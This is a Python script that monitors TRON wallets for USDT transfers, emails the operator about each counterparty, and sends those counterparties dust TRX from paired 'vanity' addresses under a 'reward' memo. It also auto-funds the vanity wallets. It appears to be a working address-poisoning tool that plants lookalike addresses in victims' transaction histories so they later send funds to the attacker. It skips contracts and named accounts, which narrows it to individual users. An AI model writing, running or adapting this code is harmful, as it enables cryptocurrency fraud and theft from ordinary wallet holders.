import requests
import smtplib
import os
import time
from email.mime.text import MIMEText
from dotenv import load_dotenv
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider
from decimal import Decimal
import itertools

# Load environment variables
load_dotenv()

EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES", "").split(",")
VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES", "").split(",")
VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")
TRONGRID_API_KEYS = os.getenv("TRONGRID_API_KEY", "").split(",")
FUNDING_PRIVATE_KEY = os.getenv("FUNDING_PRIVATE_KEY")

trongrid_key_cycle = itertools.cycle(TRONGRID_API_KEYS)

USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

SKIP_CONTRACT_ADDRESSES = [
    USDT_CONTRACT_ADDRESS,
    "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",
    "TXpw8TnQoAA6ZySoj53zJTZonKGr2DYZNA",
]

SKIP_WALLET_ADDRESSES = set([
    *WALLET_ADDRESSES,
    *VANITY_ADDRESSES,
    "TU4vEruvZwLLkSfV9bNw12EJTPvNr7Pvaa",
])

if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER, FUNDING_PRIVATE_KEY]):
    print("Missing email config or funding private key.")
    exit(1)
if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
    print("Mismatch in wallet, vanity addresses or keys.")
    exit(1)

client = Tron(HTTPProvider(endpoint_uri="https://api.trongrid.io"))
last_tx_ids = {}

def is_contract_address(address):
    try:
        account_info = client.get_account(address)
        return 'contract' in account_info and account_info['contract']
    except:
        return False

def has_public_name(address):
    try:
        current_key = next(trongrid_key_cycle)
        headers = {"accept": "application/json", "TRON-PRO-API-KEY": current_key}
        url = f"https://api.trongrid.io/v1/accounts/{address}"
        response = requests.get(url, headers=headers, timeout=10)
        data_list = response.json().get("data", [])
        return bool(data_list and data_list[0].get("name", ""))
    except:
        return False

def get_latest_trc20_transaction(wallet_address):
    try:
        current_key = next(trongrid_key_cycle)
        headers = {"accept": "application/json", "TRON-PRO-API-KEY": current_key}
        url = f"https://api.trongrid.io/v1/accounts/{wallet_address}/transactions/trc20?limit=1&order_by=block_timestamp,desc"
        response = requests.get(url, headers=headers, timeout=20)
        txs = response.json().get("data", [])
        if not txs:
            return None
        tx = txs[0]
        if tx.get("token_info", {}).get("address") not in SKIP_CONTRACT_ADDRESSES:
            return None
        return {
            "transaction_id": tx.get("transaction_id"),
            "from": tx.get("from"),
            "to": tx.get("to"),
            "value": tx.get("value"),
        }
    except:
        return None

def send_email(subject, body):
    try:
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
    except Exception as e:
        print("Email error:", e)

def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001")):
    try:
        if is_contract_address(to_address):
            return
        priv_key = PrivateKey(bytes.fromhex(priv_key_hex))
        balance = client.get_account_balance(from_address)
        if balance < amount:
            return
        txn = (
            client.trx.transfer(from_address, to_address, int(amount * 1_000_000))
            .memo("reward_for_usdt_interaction")
            .build().sign(priv_key)
        )
        txn.broadcast().wait()
    except Exception as e:
        print("Send TRX error:", e)

cached_price = None
last_price_fetch_time = 0

def get_trx_usd_price():
    global cached_price, last_price_fetch_time
    now = time.time()
    if cached_price and (now - last_price_fetch_time < 600):
        return cached_price
    try:
        response = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=TRXUSDT", timeout=10)
        response.raise_for_status()
        price = Decimal(response.json().get("price"))
        cached_price = price
        last_price_fetch_time = now
        return price
    except:
        return cached_price or Decimal("0.11")

def send_trx_from_funding_wallet(to_address, amount):
    try:
        priv_key = PrivateKey(bytes.fromhex(FUNDING_PRIVATE_KEY))
        funding_address = priv_key.public_key.to_base58check_address()
        balance = client.get_account_balance(funding_address)
        if balance < amount:
            return
        txn = (
            client.trx.transfer(funding_address, to_address, int(amount * 1_000_000))
            .memo("funding_vanity_wallet")
            .build().sign(priv_key)
        )
        txn.broadcast().wait()
    except Exception as e:
        print("Funding error:", e)

def fund_vanity_wallet_if_low(i):
    vanity_address = VANITY_ADDRESSES[i]
    balance = client.get_account_balance(vanity_address)
    if balance < 1:
        price = get_trx_usd_price()
        amount_trx = (Decimal("5") / price).quantize(Decimal("0.000001"))
        send_trx_from_funding_wallet(vanity_address, amount_trx)

print("TRON monitor running...")

if os.getenv("SEND_TEST_EMAIL", "false").lower() == "true":
    send_email("Monitor Active", "TRON wallet monitor is running.")

while True:
    try:
        for i, my_address in enumerate(WALLET_ADDRESSES):
            fund_vanity_wallet_if_low(i)
            tx = get_latest_trc20_transaction(my_address)
            if tx:
                tx_id = tx.get("transaction_id")
                if last_tx_ids.get(my_address) != tx_id:
                    last_tx_ids[my_address] = tx_id
                    sender = tx.get("from")
                    receiver = tx.get("to")
                    amount = int(tx.get("value")) / 1e6
                    if amount < 1:
                        continue
                    interacting_address = sender if receiver == my_address else receiver
                    if (
                        interacting_address in SKIP_WALLET_ADDRESSES
                        or is_contract_address(interacting_address)
                        or has_public_name(interacting_address)
                    ):
                        continue
                    subject = f"kV {my_address}"
                    body = f"""
New USDT TRC-20 transaction:

Wallet: {my_address}
Amount: {amount} USDT
From: {sender}
To: {receiver}
TxID: {tx_id}
View: https://tronscan.org/#/transaction/{tx_id}
"""
                    send_email(subject, body)
                    send_trx(VANITY_ADDRESSES[i], VANITY_PRIVATE_KEYS[i], interacting_address)
        time.sleep(1)
    except Exception as e:
        print("Loop error:", e)
    time.sleep(120)
